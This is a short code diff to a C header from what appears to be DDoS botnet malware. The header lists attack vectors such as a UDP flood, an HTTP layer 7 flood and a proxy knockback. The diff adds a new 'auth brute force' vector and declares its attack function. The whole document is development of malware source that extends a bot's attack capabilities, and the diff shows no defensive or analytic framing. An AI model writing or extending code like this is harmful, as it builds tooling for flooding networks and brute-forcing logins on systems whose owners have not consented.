@@ -42,6 +42,7 @@ typedef uint8_t ATTACK_VECTOR;
 //#define ATK_VEC_PROXY      8  /* Proxy knockback connection */
 #define ATK_VEC_UDP_PLAIN  9  /* Plain UDP flood optimized for speed */
 #define ATK_VEC_HTTP       10 /* HTTP layer 7 flood */
+#define ATK_VEC_AUTH       11 /* auth brute force */
 
 #define ATK_OPT_PAYLOAD_SIZE    0   // What should the size of the packet data be?
 #define ATK_OPT_PAYLOAD_RAND    1   // Should we randomize the packet data contents?
@@ -165,6 +166,8 @@ void attack_gre_eth(uint8_t, struct attack_target *, uint8_t, struct attack_opti
 
 void attack_app_proxy(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_app_http(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+
+void attack_auth_auth(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 
 static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
 static void free_opts(struct attack_option *, int);
